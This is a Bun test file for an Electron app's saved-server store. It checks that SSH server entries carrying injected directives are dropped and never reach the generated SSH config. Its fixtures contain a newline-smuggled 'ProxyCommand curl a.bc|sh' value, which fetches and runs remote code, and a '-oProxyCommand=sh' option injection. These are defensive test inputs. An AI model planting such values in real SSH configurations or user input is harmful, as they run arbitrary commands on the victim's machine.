import { describe, expect, it, mock } from "bun:test";
import { mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { Server } from "@shared/servers";
import { electronStub } from "./electron-stub";

const root = mkdtempSync(join(tmpdir(), "pupitre-servers-unfit-"));

mock.module("electron", () => electronStub(root));

const { corruptPath, paths, read, reload, write } = await import("../servers");

const FILE = corruptPath().replace(/\.corrupt$/, "");

const INJECTION = "x\nProxyCommand curl a.bc|sh";

const TYPED: Server = {
  host: "198.51.100.7",
  id: "srv-local-1",
  keyPath: join(root, "keys", "srv-local-1"),
  name: "Mon serveur",
  origin: "app",
  port: 22,
  user: "root",
};

const SYSTEM: Server = {
  host: "atelier",
  id: "srv-system",
  name: "atelier",
  origin: "system",
  port: 22,
  user: "",
};

function hold(servers: unknown[]): void {
  writeFileSync(
    FILE,
    JSON.stringify({ active: null, dismissed: [], servers, version: 3 })
  );
  reload();
}

describe("a saved server that would carry an SSH directive", () => {
  it("is dropped on read, without taking the others down", () => {
    hold([
      TYPED,
      SYSTEM,
      { ...TYPED, id: "srv-user", user: INJECTION },
      { ...TYPED, id: "srv-host", host: INJECTION },
      { ...TYPED, id: "srv-option", host: "-oProxyCommand=sh" },
      { ...TYPED, id: `srv${INJECTION}` },
      { ...TYPED, id: "srv-empty-user", user: "" },
      { ...SYSTEM, id: "srv-system-user", user: INJECTION },
      { ...SYSTEM, id: "srv-system-host", host: "-oProxyCommand=sh" },
    ]);

    expect(read().servers.map((server) => server.id)).toEqual([
      TYPED.id,
      SYSTEM.id,
    ]);
  });

  it("never reaches the app's SSH configuration", () => {
    hold([TYPED, { ...TYPED, id: "srv-user", user: INJECTION }]);

    write((current) => current);

    const config = readFileSync(paths().configPath, "utf8");

    expect(config).toContain("Host pupitre-srv-local-1");
    expect(config).not.toContain("ProxyCommand");
  });

  it("does not get in through a write", () => {
    hold([TYPED]);

    const written = write((current) => ({
      ...current,
      servers: [...current.servers, { ...TYPED, id: "srv-2", user: INJECTION }],
    }));

    expect(written.servers.map((server) => server.id)).toEqual([TYPED.id]);
  });
});
